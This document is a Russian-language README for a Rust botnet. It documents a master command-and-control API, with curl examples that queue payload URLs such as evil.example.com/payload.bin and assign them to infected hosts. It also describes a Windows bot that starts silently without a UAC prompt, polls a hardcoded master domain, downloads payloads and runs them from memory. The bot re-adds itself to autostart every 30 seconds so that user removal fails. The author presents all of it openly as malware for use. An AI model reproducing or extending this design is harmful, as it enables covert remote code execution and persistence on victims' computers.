> "botnet" is already cool enough

## Build
#### slave (манифест asInvoker через embed-manifest в `build.rs` — тихий старт, без UAC)
`cargo zigbuild --bin slave --release --target x86_64-pc-windows-gnu`
#### virus(sample payload)
`cargo zigbuild --bin virus --release --target x86_64-pc-windows-gnu`
#### cook iso for VM 
`xorriso -outdev output.iso -blank as_needed -map target/x86_64-pc-windows-gnu/release/virus.exe /virus.exe`

> оба бина для windows получают встроенный манифест с `asInvoker` (см. `build.rs`) — бот стартует молча, без UAC-диалога

## Master API (port 6767)

### `GET /poll` — всё состояние мастера (`que` + `pro`)
```bash
curl -s http://localhost:6767/poll
```
```json
{"que":[{"id":1,"url":"http://evil.example.com/payload.bin","status":"created","out":null}],"pro":{"192.168.1.13":1}}
```
`pro` — карта `ip -> id вируса`: слейв ищет в ней себя, чтобы узнать свою задачу и её статус.

### `POST /virus_add` — новый вирус в очередь

Секрет обязателен, иначе `401`. Мастер хранит только `url` — то, что лежит по адресу, качает сам slave. Ответ: `id = id последнего + 1`, статус `created`, `out = null`.
```bash
curl -s -X POST http://localhost:6767/virus_add \
  -H "Content-Type: application/json" \
  -d '{"url": "http://evil.example.com/payload.bin", "secret": "gazan67"}'
```
```json
{"id":1,"url":"http://evil.example.com/payload.bin","status":"created","out":null}
```

Неверный секрет → `HTTP 401`:
```bash
curl -s -w "\nHTTP %{http_code}\n" -X POST http://localhost:6767/virus_add \
  -H "Content-Type: application/json" \
  -d '{"url": "http://evil.example.com/payload.bin", "secret": "wrong"}'
```

### `POST /virus_status` — отчитаться о результате

Тело: `{"id": ..., "status": ..., "out": "..."}`. `out` — обычная строка.

* `cooked` — вирус исполнен, `out` = результат (`все по плану` от слейва):
```bash
curl -s -X POST http://localhost:6767/virus_status \
  -H "Content-Type: application/json" \
  -d '{"id": 1, "status": "cooked", "out": "все по плану"}'
```
Ответ: `virus 1 is cooked`

* `accepted` — клиент просит захватить вирус, `out` = его IP. Захват срабатывает только если вирус был `created` (гонку двух слейвов разруливает мастер). Пример для IP `192.168.1.13`:
```bash
curl -s -X POST http://localhost:6767/virus_status \
  -H "Content-Type: application/json" \
  -d '{"id": 1, "status": "accepted", "out": "192.168.1.13"}'
```
Ответ: `virus 1 accepted` (взял таску) или `virus 1 already taken` (кто-то успел раньше)

Любой другой статус → `virus <id>: прислал хуйню <статус>`.

### `POST /virus_remove` — удалить вирус по id

Тот же секрет, что и у `virus_add`:
```bash
curl -s -X POST http://localhost:6767/virus_remove \
  -H "Content-Type: application/json" \
  -d '{"id": 1, "secret": "gazan67"}'
```
Ответы: `virus 1 removed` / `virus 1 not found in que`, неверный секрет → `401`.

### `GET /pro` — сырая карта `ip -> id` для ручной проверки
```bash
curl -s http://localhost:6767/pro
```

### `POST /diddy_remove` — выкинуть дидди из `pro` по ip
Тот же секрет, что и у вирусовых эндпоинтов:
```bash
curl -s -X POST http://localhost:6767/diddy_remove \
  -H "Content-Type: application/json" \
  -d '{"ip": "192.168.1.13", "secret": "gazan67"}'
```
Ответы: `diddy 192.168.1.13 removed from pro` / `diddy 192.168.1.13 not found in pro`.

> после удаления слейв перестаёт видеть себя в `pro` и на следующем тике захватит ближайший свободный `created` как свежий бот

### `POST /diddy_assign_virus` — переназначить дидди на вирус
```bash
curl -s -X POST http://localhost:6767/diddy_assign_virus \
  -H "Content-Type: application/json" \
  -d '{"ip": "192.168.1.13", "id": 2, "secret": "gazan67"}'
```
Ответ: `diddy 192.168.1.13 now carries virus 2`

> перезапись в `pro` без проверок: слейв на следующем тике увидит новое назначение и, если статус того вируса не `cooked`, исполнят его

### `POST /virus_clear` — снести всю очередь разом
```bash
curl -s -X POST http://localhost:6767/virus_clear \
  -H "Content-Type: application/json" \
  -d '{"secret": "gazan67"}'
```
Ответ: `que очищена, удалено вирусов: N`

### `POST /diddy_clear` — уволить всех дидди из `pro` разом
```bash
curl -s -X POST http://localhost:6767/diddy_clear \
  -H "Content-Type: application/json" \
  -d '{"secret": "gazan67"}'
```
Ответ: `pro очищена, уволено дидди: N`

> Секрет (`gazan67`) прикрывает только админские ручки: `virus_add`, `virus_remove`, `virus_clear`, `diddy_remove`, `diddy_assign_virus`, `diddy_clear`. Ручки, куда стучатся слейвы (`/poll`, `/pro`, `/virus_status`), открыты.

## Slave

Адрес дидди — константа `MASTER = "http://master.impostorboy.ru"` в начале `src/slave.rs`.

`/poll` ретраится при ошибке: экспоненциальный backoff 5 → 10 → 20 → ... сек (потолок — минутный интервал) до успеха, поэтому не пойманное дидди не ванну.

Жизненный цикл на каждый тик (раз в минуту):
1. `GET /poll` → приходит весь снапшот (`que` + `pro`)
2. ищем себя в `pro` по своему IP:
   - **нашли** → смотрим статус назначенного вируса: не `cooked` → исполняем (FAQ-путь для рестартнувшегося слейва: доделает то, что не успел), `cooked` → отдыхаем
   - **не нашли** → я свободный бот: беру вирус с наименьшим `id` со статусом `created` и шлю `accepted` со своим IP в `out`; мастер отвечает `virus N accepted` (захват успешен, дальше я единственный исполнитель) или `virus N already taken` (пролетел, но не расстраиваемся)
3. исполняет из памяти через maple — без промежуточных отчётов, сразу считать и выдать
4. шлёт `POST /virus_status` со статусом `cooked` — в `out` лежит `все по плану`; после этого вирус в `que` считает себя выполненным

Всё под `tokio::spawn` — не тормозим следующий poll.

### Автозапуск (страж)

Slave каждые 30 сек **слепо перерегистрирует себя** в автозапуске крейтом `auto-launch` (`disable()` + `enable()` с свежим `current_exe()`), `autostart_watchdog` в `src/slave.rs`, первый чек — сразу при старте:

- Windows: ключ `HKCU\Software\...\Run` (`WindowsEnableMode::CurrentUser` — без админа, в духе asInvoker) + разруливание гашения через Task Manager (`StartupApproved`)
- Linux: `~/.config/autostart/*.desktop` (для тестов; slave целится в Windows)
- имя записи — `diddy slave`

Слепая перерегистрация гарантирует свежий путь в записи после переезда exe, убранные вручную/Task Manager'ом записи возвращаются через ≤30 сек.
